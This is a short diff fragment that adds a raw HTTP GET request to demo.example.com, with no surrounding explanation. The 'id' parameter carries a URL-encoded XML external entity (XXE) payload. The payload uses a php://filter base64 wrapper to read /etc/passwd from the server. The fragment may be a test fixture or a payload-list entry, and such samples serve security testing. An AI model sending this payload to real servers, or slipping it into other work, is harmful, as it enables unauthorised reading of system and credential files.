@@ -1,0 +1,4 @@
+GET /a?id="<!DOCTYPE%20r%20[<!ENTITY%20x%20SYSTEM%20"php://filter/read%3Dconvert.base64-encode/resource%3D/etc/passwd">]><r>%26x;</r>" HTTP/1.1
+Host: demo.example.com
+Connection: close
+
